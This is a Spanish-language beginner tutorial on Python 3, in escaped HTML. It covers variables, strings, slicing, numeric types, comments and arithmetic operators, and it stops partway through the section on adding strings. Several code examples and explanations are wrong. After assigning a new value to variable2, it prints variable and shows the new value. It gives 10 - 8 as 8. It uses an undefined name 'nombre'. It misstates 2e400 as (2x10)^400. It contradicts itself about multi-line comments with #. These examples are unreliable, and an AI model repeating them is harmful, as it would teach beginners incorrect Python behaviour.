  &lt;li&gt;&lt;a href=&quot;#numeros&quot;&gt;Numeros&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#numeros-enteros&quot;&gt;Numeros Enteros&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#numeros-flotantes&quot;&gt;Numeros Flotantes&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#numeros-complejos&quot;&gt;Numeros Complejos&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentarios&quot;&gt;Comentarios&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#comentarios-de-varias-lineas&quot;&gt;Comentarios de Varias Lineas&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-aritmeticos&quot;&gt;Operadores Aritmeticos&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#suma-y-resta&quot;&gt;Suma y Resta&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#sumar-y-restar-datos-numericos&quot;&gt;Sumar y restar datos Numericos&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#sumar-y-restar-datos-strings&quot;&gt;Sumar y restar datos Strings&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#multiplicación-y-división&quot;&gt;Multiplicación y División&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#multiplicar-y-dividir-datos-numericos&quot;&gt;Multiplicar y dividir datos Numericos&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#multiplicar-y-dividir-datos-strings&quot;&gt;Multiplicar y dividir datos Strings&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#modulo&quot;&gt;Modulo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#exponencial&quot;&gt;Exponencial&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#division-entera&quot;&gt;Division Entera&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-de-asignación&quot;&gt;Operadores de Asignación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#booleanos&quot;&gt;Booleanos&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-de-comparación&quot;&gt;Operadores de Comparación&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#comparación-entre-datos-numericos&quot;&gt;Comparación entre datos numericos&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#comparación-entre-datos-strings&quot;&gt;Comparación entre datos strings&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-de-identidad&quot;&gt;Operadores de Identidad&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-de-pertenencia&quot;&gt;Operadores de Pertenencia&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-logicos&quot;&gt;Operadores Logicos&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-not&quot;&gt;Operador not&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-or&quot;&gt;Operador or&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-and&quot;&gt;Operador and&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#listas&quot;&gt;Listas&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#acceso-a-elementos-de-una-lista&quot;&gt;Acceso a elementos de una lista&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operaciones-con-listas&quot;&gt;Operaciones con listas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#listas-anidadas&quot;&gt;Listas anidadas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#las-listas-son-mutables&quot;&gt;Las listas son mutables&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#funciones&quot;&gt;Funciones&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funciones-personalizadas&quot;&gt;Funciones Personalizadas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#argumentos-de-las-funciones&quot;&gt;Argumentos de las Funciones&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#argumentos-posicionales&quot;&gt;Argumentos Posicionales&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#argumentos-de-palabras-clave&quot;&gt;Argumentos de Palabras Clave&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#parametros-con-valores-por-defecto&quot;&gt;Parametros con Valores por Defecto&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sentencia-return&quot;&gt;Sentencia Return&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#docstring&quot;&gt;Docstrings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funciones-propias-de-python&quot;&gt;Funciones Propias de Python&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tuplas&quot;&gt;Tuplas&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funcionamiento-de-las-tuplas&quot;&gt;Funcionamiento de las Tuplas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cuando-utilizar-una-tupla-en-vez-de-una-lista&quot;&gt;Cuando utilizar una Tupla en vez de una Lista&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#tuplas-y-tipos-de-datos-numericos&quot;&gt;Tuplas y tipos de datos Numericos&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#packing-y-unpacking---empaquetado-y-desempaquetado&quot;&gt;Packing y Unpacking - Empaquetado y Desempaquetado&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#diccionarios&quot;&gt;Diccionarios&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#acceso-a-los-elementos-de-un-diccionario&quot;&gt;Acceso a los elementos de un Diccionario&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sintaxis&quot;&gt;Sintaxis &lt;a href=&quot;#sintaxis&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Cuando hablamos de la sintaxis en Python3, nos referimos como en todo lenguaje al correcto uso y orden de las palabras que utilizamos para comunicarnos. Por ello, en Python3 también es necesario cumplir ciertos requisitos a la hora de expresarnos.&lt;/p&gt;

&lt;p&gt;Comenzaremos con la sintaxis tipica que nos ayuda a imprimir los valores concretamente su nombre es &lt;code&gt;print&lt;/code&gt; que viene a ser una funcion interna de Python que recibe una variable o tipo de dato y nos lo muestra por pantalla, por ahora solo hay que tener presente el concepto de &lt;code&gt;print&lt;/code&gt; ya que mas adelante profundizaremos en los demas conceptos que nos ayudaran a comprender mejor como funciona este lenguaje.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Hola Python3&quot;)

Hola Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;variables&quot;&gt;Variables &lt;a href=&quot;#variables&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Una variable es un elemento de un lenguaje de programación que tiene asignado un valor determinado. Para crear una variable en Python3 debemos proporcionarle un nombre y asignarle un valor utilizando el símbolo &lt;code&gt;=&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;

print(variable)

Hola Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora el valor asignado a la variable puede cambiar a lo largo del codigo a otra difierente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;

print(variable)

Hola Python3

variable2 = &quot;Adios Python3&quot;

print(variable)

Adios Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;tipos-de-variables&quot;&gt;Tipos de Variables&lt;/h2&gt;

&lt;p&gt;Existen 4 tipos de variables principales o primitivas en Python3, concretamente estas son:&lt;/p&gt;

&lt;p&gt;Tipo&lt;code&gt;int&lt;/code&gt;: Para representar numeros enteros.
Tipo &lt;code&gt;string&lt;/code&gt;: Para representar texto o cadenas.
Tipo &lt;code&gt;boolean&lt;/code&gt;: Para representar datos binarios, es decir que pueden tomar los valores &lt;code&gt;True&lt;/code&gt; o &lt;code&gt;False&lt;/code&gt;.
Tipo &lt;code&gt;float&lt;/code&gt;: Para representar numeros con decimales.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Representacion&lt;/th&gt;
      &lt;th&gt;Tipo&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;numeros enteros&lt;/td&gt;
      &lt;td&gt;int&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cadenas de texo&lt;/td&gt;
      &lt;td&gt;string&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;numeros decimales&lt;/td&gt;
      &lt;td&gt;float&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;dato binario(True o False)&lt;/td&gt;
      &lt;td&gt;boolean&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Definimos un conjunto de variables segun su tipo y usamos la funcion reservada de python &lt;code&gt;type()&lt;/code&gt; para ver el tipo de variable segun su asignacion:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = 10

variable4 = 2.4

variable2 = &quot;Hola Python&quot;

variable3 = True

variable4 = 2.4

type(variable1)

int

type(variable2)

str

type(variable3)

bool

type(variable4)

float
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;asignación-multiple-de-variables&quot;&gt;Asignación Multiple de Variables&lt;/h2&gt;

&lt;p&gt;En Python3 podemos asignar una variable a otra variable diferente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;

variable2 = variable

print(variable2)

Hola Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;sintaxis-de-variables&quot;&gt;Sintaxis de Variables&lt;/h2&gt;

&lt;p&gt;En Python3 se debe cumplir con las reglas sintácticas definidas por el leguaje. A continuación indicamos las reglas que debemos cumplir cuando definimos el nombre de una variable:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Las variables en Python3 pueden tener cualquier longitud y pueden consistir en letras mayúsculas y minúsculas &lt;code&gt;A-Z, a-z&lt;/code&gt;, dígitos del &lt;code&gt;0-9&lt;/code&gt; y el carácter de subrayado o subguion &lt;code&gt;_&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;_variable = &quot;Hola Python3&quot;

print(_variable)

Hola Python3

vAriAbLe = &quot;Hola Python3&quot;

print(vAriAbLe)

Hola Python3

variable_1_1 = &quot;Hola Python3&quot;

print(variable_1_1)

Hola Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Si no se cumple con las reglas definidas de sintaxys, emitiran un error&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;  variable$ = &quot;Hola Python3&quot;

    File &quot;&amp;lt;iPython3-input-12-f520f3dd0eb3&amp;gt;&quot;, line 1
      variable$ = &quot;Hola Python3&quot;
         ^
  SyntaxError: invalid syntax
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;El nombre de una variable puede contener dígitos, pero el primer caracter de un nombre de variable no puede ser un dígito.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;  1variable = &quot;Hola Python3&quot;

    File &quot;&amp;lt;iPython3-input-13-905ee4ad3fed&amp;gt;&quot;, line 1
      1variable = &quot;Hola Python3&quot;
     ^
  SyntaxError: invalid syntax
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
  &lt;li&gt;El nombre de las variables en Python3 es sensible a mayúsculas y minúsculas&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;   Variable1 = &quot;Hola Python3&quot;

   print(variable1)

   ---------------------------------------------------------------------------
   NameError                                 Traceback (most recent call last)
   &amp;lt;iPython3-input-15-32693f267891&amp;gt; in &amp;lt;module&amp;gt;
   ----&amp;gt; 1 print(variable1)

   NameError: name 'variable1' is not defined
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;Strings&quot;&gt;Strings &lt;a href=&quot;#Strings&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Un string se corresponde con un conjunto de caracteres que forman una cadena de texto.&lt;/p&gt;

&lt;p&gt;La sintaxis que debemos utilizar para definir strings en Python consiste en situar los caracteres entre &lt;code&gt;&quot; o '&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = &quot;Esto es mi primer string&quot;

variable2 = 'Esto es mi segunda string'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La flexibilidad de definir &lt;code&gt;string&lt;/code&gt; con el caracter “ y el caracter ‘ nos permite definir cadenas de texto que contienen esos mismos caracteres.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = 'Los tipos strings pueden definirse con el caracter &quot;'

variable2 = &quot;Los tipos strings pueden definirse con el caracter '&quot;

print(variable1)

Los strings pueden definirse con el caracter &quot;

print(variable2)

Los strings pueden definirse con el caracter '
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;indexación&quot;&gt;Indexación&lt;/h2&gt;

&lt;p&gt;En muchos tipos de datos en Python3 se puede acceder a los elementos individuales de un conjunto de datos directamente mediante un índice numérico o un valor clave. Este proceso se denomina &lt;code&gt;indexación&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En Python3, las cadenas son secuencias ordenadas de caracteres, y por lo tanto pueden ser indexadas de esta manera. Se puede acceder a los caracteres individuales de una cadena especificando el nombre de la cadena seguido de un número entre corchetes &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El primer carácter de la cadena tendra el índice 0, el siguiente el índice 1, y así sucesivamente. El índice del último carácter será la longitud de la cadena menos uno.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Python&quot;

lenguaje[0]

'P'

lenguaje[2]

't'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos tambien utilizar números negativos para extraer los caracteres por el final de la cadena de texto, donde &lt;code&gt;-1&lt;/code&gt; seria la parte final y asi sucesivamente de derecha a izquierda.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje[-1]

'n'

lenguaje[-3]

'h'
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;slicing&quot;&gt;Slicing&lt;/h2&gt;

&lt;p&gt;Python3 permite una sintaxis específica de indexación que extrae subcadenas de una cadena de texto, a esto se denomina ‘&lt;code&gt;slicing&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La sintaxis que se utiliza para extraer una subcadena de una cadena de nombre &lt;code&gt;micadena&lt;/code&gt; es de la forma &lt;code&gt;micadena[x:y]&lt;/code&gt;, esto devuelve la parte de la cadena &lt;code&gt;micadena&lt;/code&gt; que comienza en la posición &lt;code&gt;x&lt;/code&gt;,y termina en la posición &lt;code&gt;y&lt;/code&gt;; con la exepción de que no se incluye el último caracter.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;

lenguaje[0:4]

'Hola'

lenguaje[-6:-1]

'Pytho'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos observar que efectivamente no se incluye el ultimo caracter que se especifica: &lt;code&gt;ojo tener en cuenta que los espacios tambien son caracteres correspondientes a una cadena vacia&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Pero que pasaria entonces si no indicamos uno de los numeros:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;

lenguaje[-6:]

'Python'

lenguaje[5:]

'Python'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si no indicamos alguno de los numeros lo que hace Python3 es leer hasta el final.&lt;/p&gt;

&lt;h2 id=&quot;stride&quot;&gt;Stride&lt;/h2&gt;

&lt;p&gt;Es una variante más del slicing. Si se añade un : adicional y un tercer índice, se designa una stride, que indica cuantos caracteres saltar hasta obtener el siguiente caracter.&lt;/p&gt;

&lt;p&gt;Este salto lo hara contando el propio caracter.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;

lenguaje[0:4:2]

'Hl'

lenguaje[0:4:1]

'Hola'

nombre[0:8:3]

'ha'
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;modificación-de-strings&quot;&gt;Modificación de Strings&lt;/h2&gt;

&lt;p&gt;Una string es un tipo de dato que en Python3 se considera &lt;code&gt;inmutable&lt;/code&gt;, esto quiere decir que no podemos modificar una parte de un string asociada a una variable&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Python&quot;

lenguaje[2]

't'

lenguaje[2] = 'a'

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-37-3f77b4874756&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 lenguaje[2] = 'a'

TypeError: 'str' object does not support item assignment
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero a pesar de no poderse modificar el contenido de una string, si se puede asignar un string diferente a la variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;golang&quot;

print(lenguaje)

golang
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;strings-de-multiples-lineas&quot;&gt;Strings de multiples lineas&lt;/h2&gt;

&lt;p&gt;Si en alguna ocasion queremos definir &lt;code&gt;strings&lt;/code&gt; de varias lineas podemos hacerlo de varias formas en Python3&lt;/p&gt;

&lt;p&gt;Una de ellas seria introducir el caracter &lt;code&gt;\n&lt;/code&gt; en la posicion de la cadena donde queremos que realize el salto de linea&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Mi\nlenguaje\nfavorito\nes\nPython&quot;

print(lenguaje)
Mi
lenguaje
favorito
es
Python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra opción tambien podria usar los caracteres &lt;code&gt;&quot;&quot;&quot;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;&quot;&quot;Mi
lenguaje
favorito
es
Python
&quot;&quot;&quot;

print(lenguaje)
Mi
lenguaje
favorito
es
Python
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;numeros&quot;&gt;Numeros&lt;/h1&gt;

&lt;p&gt;Existen 3 tipos de datos numéricos: enteros &lt;code&gt;int&lt;/code&gt;, números de punto flotante &lt;code&gt;float&lt;/code&gt; y números complejos.&lt;/p&gt;

&lt;h2 id=&quot;numeros-enteros&quot;&gt;Numeros Enteros&lt;/h2&gt;

&lt;p&gt;Los números enteros son aquellos que no tienen parte decimal. En Python3 se referencian con la palabra &lt;code&gt;int&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;No olvidemos que es muy importante la diferencia de un número entero y una cadena de texto que representa un número entero.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 10
num = &quot;10&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos convertir una cadena de texto que representa un número entero en un valor numérico utilizando la función &lt;code&gt;int()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = &quot;10&quot;

print(numero)

'10'

numero2 = int(numero)

print(numero2)

10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para separar algunos dígitos para que sea más facil de leer. No podemos usar el &lt;code&gt;.&lt;/code&gt; o &lt;code&gt;,&lt;/code&gt; , para esto Python3 nos da la opcion de usar &lt;code&gt;_&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 5000000

print(numero)

5000000

numero2 = 5_000_000

print(numero2)

5000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No hay límite en el tamaño de los números enteros que podemos definir, ya que se pueden definir números enteros tan grandes como la memoria de nuestro sistema soporte.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero

print(numero)

100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;numeros-flotantes&quot;&gt;Numeros Flotantes&lt;/h2&gt;

&lt;p&gt;Los números flotantes son aquellos que tienen una parte decimal, en &lt;code&gt;Python3&lt;/code&gt; se referencian con la palabra &lt;code&gt;float&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 10.5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;De igual manera que con los números enteros, se puede convertir una cadena de texto que representa un número flotante a un valor numérico utilizando la función &lt;code&gt;float()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = &quot;12.4&quot;

print(numero)

'12.4'

numero2 = float(numero)

print(numero2)

12.4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Existen tres formas de representarlos en Python3.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 1000.0

numero2 = 1_000.0

numero3 = 1e3

print(numero1)

1000.0

print(numero2)

1000.0

print(numero3)

1000.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A diferencia que los números enteros, los número de flotantes si tienen un tamaño máximo en Python3. Aunque el tamaño máximo dependera de nuestro sistema, las cifras cercanas o mayores a &lt;code&gt;2e400&lt;/code&gt; que equivale a &lt;code&gt;(2x10)^400&lt;/code&gt; suelen superar el tamaño máximo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 2e400

print(numero)

inf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Python3 devuelve &lt;code&gt;inf&lt;/code&gt; haciendo referencia a infinito.&lt;/p&gt;

&lt;h2 id=&quot;numeros-complejos&quot;&gt;Numeros complejos&lt;/h2&gt;

&lt;p&gt;Hay pocos lenguajes de programacion que ofrecen soporte integrado para números complejos y Python3 es uno de ellos. Aunque los números complejos no suelen aparecer fuera de los dominios de la computación científica, pueden ser de gran utilidad en dominios que usen técnicas estadísticas.&lt;/p&gt;

&lt;p&gt;Un número complejo esta formado por 2 componentes distintos: una parte real y una parte imaginaria.&lt;/p&gt;

&lt;p&gt;En Python3 podemos definir un numero complejo, se define la parte real seguida de un símbolo + y la parte imaginaria terminando con la letra j.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 2 + 4j

print(numero)

(2+4j)

numero.real

2.0

numero.imag

4.0
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;comentarios&quot;&gt;Comentarios &lt;a href=&quot;#comentarios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Los comentarios son parte fundamental en cualquier lenguaje de programación. Permiten describir partes del código que desarrollamos de manera que sea mucho más facil de comprender. Poner comentarios en nuestro código es una muy buena práctica que debemos realizar.&lt;/p&gt;

&lt;p&gt;La manera más simple de poner comentarios en Python3 es utilizando el símbolo &lt;code&gt;#&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Este es mi comentario
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos hacer lo mismo despues de escribir una sentencia en nuestro codigo haciendo referencia al significado de esta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot; # Esto es una variable
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;comentarios-de-varias-lineas&quot;&gt;Comentarios de varias lineas&lt;/h2&gt;

&lt;p&gt;Hay ocasiones en que necesitemos poner comentarios de varias líneas. Python3 no permite crear un comentario de varias líneas utilizando el mismo símbolo #.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Este comentario
# tiene varias lineas
# para mi ejemplo en Python3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Existe una manera mas sencilla y comoda de hacer comentarios en Python3 con el uso de &lt;code&gt;&quot;&quot;&quot; todo el comentario &quot;&quot;&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&quot;&quot;&quot;
Este comentario
tiene varias líneas
para mi ejemplo en Python3
&quot;&quot;&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;operadores-aritmeticos&quot;&gt;Operadores Aritmeticos &lt;a href=&quot;#operadores-aritmeticos&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;A continuación se muestran los operadores aritméticos soportados por Python3:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operador&lt;/th&gt;
      &lt;th&gt;Significado&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a + b&lt;/td&gt;
      &lt;td&gt;suma&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a - b&lt;/td&gt;
      &lt;td&gt;resta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a * b&lt;/td&gt;
      &lt;td&gt;multiplicacion&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a / b&lt;/td&gt;
      &lt;td&gt;division&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a % b&lt;/td&gt;
      &lt;td&gt;modulo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a // b&lt;/td&gt;
      &lt;td&gt;division de enteros&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a ** b&lt;/td&gt;
      &lt;td&gt;exponencial&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;suma-y-resta&quot;&gt;Suma y Resta&lt;/h2&gt;

&lt;p&gt;Los operadores suma &lt;code&gt;+&lt;/code&gt;y resta &lt;code&gt;-&lt;/code&gt; se pueden aplicar a distintos tipos de datos.&lt;/p&gt;

&lt;h3 id=&quot;sumar-y-restar-datos-numericos&quot;&gt;Sumar y restar datos numericos&lt;/h3&gt;

&lt;p&gt;Al sumar o restar tipos de datos numericos obtenemos el resultado matematico.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10

numero2 = 8

print(numero1 + numero2)

18

print(numero1 - numero2)

8

print(numero2 - numero1)

-2

numero3 = 2.5

numero4 = 1.5

print(numero3 + numero4)

4.0

print(numero3 - numero4)

1.0
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;sumar-y-restar-datos-strings&quot;&gt;Sumar y restar datos strings&lt;/h3&gt;

&lt;p&gt;Cuando sumamos tipos de datos strings se concatenan las variables.&lt;/p&gt;

